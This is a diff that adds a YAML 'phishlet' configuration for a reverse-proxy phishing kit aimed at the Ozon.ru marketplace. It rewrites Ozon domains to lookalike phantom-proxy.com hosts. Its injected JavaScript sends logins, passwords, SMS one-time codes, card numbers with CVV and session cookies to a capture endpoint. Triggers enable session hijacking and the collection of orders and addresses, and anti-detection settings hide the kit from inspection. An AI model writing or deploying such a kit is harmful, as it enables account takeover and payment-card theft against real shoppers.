@@ -1,0 +1,276 @@
+# ============================================================================
+# Ozon Phishlet
+# Полный перехват сессий Ozon.ru
+# ============================================================================
+
+id: ozon
+name: Ozon (Маркетплейс)
+author: PhantomProxy Team
+version: "2.0"
+description: |
+  Перехват сессий Ozon:
+  - Вход по email/телефону
+  - SMS подтверждение
+  - Перехват данных карт
+  - Перехват заказов и адресов
+
+target:
+  primary: "www.ozon.ru"
+  secondary:
+    - "ozon.ru"
+    - "api.ozon.ru"
+    - "seller.ozon.ru"
+    - "id.ozon.ru"
+    - "m.ozon.ru"
+
+sub_filters:
+  - type: "domain"
+    from: "www.ozon.ru"
+    to: "www.phantom-proxy.com"
+    priority: 1
+    
+  - type: "domain"
+    from: "ozon.ru"
+    to: "phantom-proxy.com"
+    priority: 2
+    
+  - type: "domain"
+    from: "api.ozon.ru"
+    to: "api.phantom-proxy.com"
+    priority: 3
+    
+  - type: "domain"
+    from: "id.ozon.ru"
+    to: "id.phantom-proxy.com"
+    priority: 4
+    
+  - type: "domain"
+    from: "seller.ozon.ru"
+    to: "seller.phantom-proxy.com"
+    priority: 5
+
+  - type: "domain"
+    from: "cdn1.ozone.ru"
+    to: "cdn.phantom-proxy.com"
+    priority: 100
+
+js_inject: |
+  (function() {
+    'use strict';
+    
+    console.log('[PhantomProxy] Ozon phishlet loaded');
+    
+    const ozonCapture = {
+      // Перехват логина/пароля
+      captureCredentials: function(form) {
+        const email = form.querySelector('input[type="email"]')?.value || 
+                      form.querySelector('input[type="tel"]')?.value ||
+                      form.querySelector('input[name="email"]')?.value || '';
+        const password = form.querySelector('input[type="password"]')?.value || '';
+        
+        if (email || password) {
+          fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'ozon_credentials',
+              email: email,
+              password: password,
+              url: window.location.href
+            })
+          });
+        }
+      },
+      
+      // Перехват SMS кода
+      captureSMS: function(code) {
+        if (code && code.length >= 4 && /^\d+$/.test(code)) {
+          fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'ozon_sms',
+              code: code,
+              url: window.location.href
+            })
+          });
+        }
+      },
+      
+      // Перехват данных карты
+      captureCard: function(form) {
+        const cardNumber = form.querySelector('input[name="card_number"]')?.value ||
+                          form.querySelector('input[placeholder*="Номер карты"]')?.value || '';
+        const expiry = form.querySelector('input[name="expiry"]')?.value || '';
+        const cvv = form.querySelector('input[name="cvv"]')?.value ||
+                   form.querySelector('input[name="cvc"]')?.value || '';
+        
+        if (cardNumber) {
+          fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'ozon_card',
+              card_number: cardNumber,
+              expiry: expiry,
+              cvv: cvv,
+              url: window.location.href
+            })
+          });
+        }
+      },
+      
+      // Перехват сессии
+      captureSession: function() {
+        const cookies = {
+          ozon_web_id: this.getCookie('ozon_web_id'),
+          ozon_user_id: this.getCookie('ozon_user_id'),
+          ssoid: this.getCookie('ssoid'),
+          refresh_token: this.getCookie('refresh_token')
+        };
+        
+        fetch('/api/capture', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            type: 'ozon_session',
+            cookies: cookies,
+            url: window.location.href
+          })
+        });
+      },
+      
+      getCookie: function(name) {
+        const value = `; ${document.cookie}`;
+        const parts = value.split(`; ${name}=`);
+        if (parts.length === 2) return parts.pop().split(';').shift();
+        return '';
+      }
+    };
+    
+    // Перехват форм
+    document.addEventListener('submit', function(e) {
+      const form = e.target;
+      if (form.action && form.action.includes('ozon')) {
+        ozonCapture.captureCredentials(form);
+        
+        // Проверка на форму карты
+        if (form.querySelector('input[name="card_number"]') || 
+            form.querySelector('input[placeholder*="Номер карты"]')) {
+          ozonCapture.captureCard(form);
+        }
+      }
+    }, true);
+    
+    // Перехват SMS input
+    document.addEventListener('input', function(e) {
+      if (e.target.tagName === 'INPUT') {
+        const name = e.target.name || e.target.id;
+        const placeholder = e.target.placeholder || '';
+        if (name.includes('sms') || name.includes('code') || 
+            placeholder.includes('код из СМС')) {
+          if (e.target.value.length >= 4) {
+            ozonCapture.captureSMS(e.target.value);
+          }
+        }
+      }
+    }, true);
+    
+    // Захват при загрузке
+    window.addEventListener('load', function() {
+      ozonCapture.captureSession();
+    });
+    
+    // Скрытие
+    Object.defineProperty(navigator, 'webdriver', { get: () => false });
+    
+  })();
+
+triggers:
+  - name: "ozon_login"
+    path_regex: "/login|/auth|/signin"
+    actions:
+      - type: "inject_js"
+        payload: "ozon_login.js"
+      - type: "capture_form"
+        fields: ["email", "phone", "password", "pass"]
+      - type: "realtime_capture"
+        enabled: true
+        
+  - name: "ozon_sms"
+    path_regex: "/sms|/verify|/confirm|/otp"
+    actions:
+      - type: "capture_form"
+        fields: ["sms_code", "code", "verification_code"]
+      - type: "wait_for_input"
+        timeout: 180
+        
+  - name: "ozon_main"
+    host_regex: "www.ozon.ru"
+    path_exclude: "/login|/auth"
+    actions:
+      - type: "capture_cookies"
+        cookies: ["ozon_web_id", "ozon_user_id", "ssoid"]
+      - type: "session_hijack"
+        enabled: true
+      - type: "capture_orders"
+        enabled: true
+      - type: "capture_addresses"
+        enabled: true
+        
+  - name: "ozon_payment"
+    path_regex: "/payment|/checkout|/cart"
+    actions:
+      - type: "capture_form"
+        fields: ["card_number", "cardNumber", "expiry", "cvv", "cvc"]
+      - type: "capture_cards"
+        enabled: true
+
+cookies:
+  critical:
+    - "ozon_web_id"
+    - "ozon_user_id"
+    - "ssoid"
+    - "refresh_token"
+    
+  session:
+    - "access_token"
+    - "device_id"
+    - "visitor_id"
+    
+  additional:
+    - "ozon_fid"
+    - "ab_test"
+
+headers:
+  - "Authorization"
+  - "X-Ozon-Session"
+  - "X-Client-Id"
+
+anti_detection:
+  hide_webdriver: true
+  spoof_navigator: true
+  anti_devtools: true
+  random_timings: true
+  canvas_spoof: true
+  timezone_spoof: "Europe/Moscow"
+  language_spoof: "ru-RU"
+
+performance:
+  cache_static: true
+  compress_responses: true
+  lazy_images: true
+  minify_js: true
+  enable_brotli: true
+
+ssl:
+  min_version: "TLS1.2"
+
+logging:
+  log_requests: true
+  log_responses: true
+  log_errors: true
+  log_path: "./logs/ozon/"
+  log_timezone: "Europe/Moscow"
+  # PCI DSS compliance для карт
+  encrypt_sensitive: true
